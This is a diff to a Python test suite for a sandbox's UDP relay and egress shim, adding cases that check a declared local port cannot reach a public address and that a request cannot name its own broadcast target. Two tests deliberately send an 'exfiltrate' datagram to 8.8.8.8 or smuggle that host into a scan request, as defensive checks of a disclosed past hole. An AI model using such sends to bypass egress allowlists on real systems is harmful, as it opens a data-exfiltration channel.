@@ -107,7 +107,10 @@ def wire(root: Path, domain: str, permissions: dict) -> tuple[EgressShim, UdpRel
         {"domain": domain, "name": domain, "version": "1.0.0",
          "permissions": {"schema_version": 1, **permissions}}))
     policy = policy_for({domain: Manifest.load(directory, root)})
-    relay = UdpRelay()
+    # Loopback devices, because this suite has no other machine. Allowed by the relay's own
+    # constructor, never by a request — and a relay built without it refuses loopback (case 2d's
+    # rule; `UdpRelay.allow_loopback`).
+    relay = UdpRelay(allow_loopback=True, broadcast_address="127.0.0.1")
     decisions: list = []
 
     def decide(op: str, **fields):
@@ -229,6 +232,19 @@ def case_unicast(root: Path) -> None:
               "2b. and the denial names the clause that held no match (F3)",
               str(refused.clause) if refused else "")
 
+        # 2d. The declared port, to an address that is **not** on the home network. Until the review
+        # of W2 (2026-10-04) the relay sent anywhere, so `network.local.udp` reached the internet:
+        # an exfiltration channel around the egress allowlist, open since 2026-09-03.
+        public = None
+        try:
+            socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"exfiltrate",
+                                                                    ("8.8.8.8", port))
+        except EgressRefused as err:
+            public = err
+        check(public is not None and "home network" in public.reason,
+              "2d. a declared local UDP port does not reach a public address",
+              public.reason if public else "it was sent")
+
         # 2c. W2 (a) baseline, arm C: a refused send left a peer behind, every later recvfrom
         # asked the relay for it and was refused, and the integration's retry loop turned that
         # into ~1,000 refused decisions a second. Now the socket just times out, asking nothing.
@@ -326,6 +342,17 @@ def case_discovery(root: Path) -> None:
               f"{data.decode(errors='replace')} from {sender}")
         sock.close()
 
+        # 5b. The scan's target is the relay's own, never the request's. Until the review of W2 it
+        # was read from the request, so a sandbox could name any host as its "broadcast" address.
+        scan_request = {"op": "discover.scan", "port": port, "data": "", "timeout": 0.2,
+                        "broadcast": "8.8.8.8"}
+        allowed = policy_for({"demo_scanner": Manifest.load(
+            root / "custom_components" / "demo_scanner", root)})("demo_scanner", scan_request)
+        relay.scan("demo_scanner", scan_request, allowed)
+        targets = [a.get("target") for a in relay.activity if a.get("op") == "discover.scan"]
+        check(targets and targets[-1] == relay.broadcast_address,
+              "5b. a scan goes to the relay's own broadcast address, whatever the request says",
+              f"targets {targets}")
         observed = getattr(relay, "last_scan", {}).get("observed") or []
         check("127.0.0.1" in observed,
               "5. the scan reports which addresses answered — the observed-responder set",
@@ -486,6 +513,40 @@ def case_no_relay_fails_closed(root: Path) -> None:
     check(outcome == "ok" and len(refused) == 1,
           "7e. an undeclared bind and a multicast join succeed quietly; the listen is refused once",
           f"{outcome}; {len(refused)} refused listen")
+    # 7f. `govee`'s scan: an asyncio endpoint on a bound socket broadcasts, and the replies the
+    # mediator collected must wake the event loop. Until the review of 2026-10-04 they were kept in
+    # a list for the next `recvfrom`, which an asyncio transport never makes unless its descriptor
+    # becomes readable, so a broadcast scan from asyncio found nothing.
+    device4, port4 = echo_device(b"scan-reply")
+    shim4, relay4, _ = wire(root, "demo_scan", {"network": {"discover": {"scan": [port4]}}})
+    scanned: list = []
+
+    class ScanReply(asyncio.DatagramProtocol):
+        def datagram_received(self, data, addr):
+            scanned.append(data)
+
+    async def scan_and_wait() -> None:
+        loop = asyncio.get_running_loop()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.bind(("0.0.0.0", 0))
+        sock.setblocking(False)
+        transport, _ = await loop.create_datagram_endpoint(ScanReply, sock=sock)
+        transport.sendto(b"scan", ("255.255.255.255", port4))
+        for _ in range(30):
+            if scanned:
+                break
+            await asyncio.sleep(0.1)
+        transport.close()
+    try:
+        shim4.install()
+        asyncio.run(scan_and_wait())
+    finally:
+        shim4.uninstall()
+        relay4.close()
+        device4.close()
+    check(scanned == [b"scan-reply"],
+          "7f. an asyncio endpoint's broadcast scan delivers its replies to the event loop",
+          f"{scanned}")
     listens = [d for op, d in decisions if op == "discover.listen"]
     check(len(listens) == 1 and listens[0].allowed,
           "7c. and the listen is one recorded decision, however many datagrams follow",
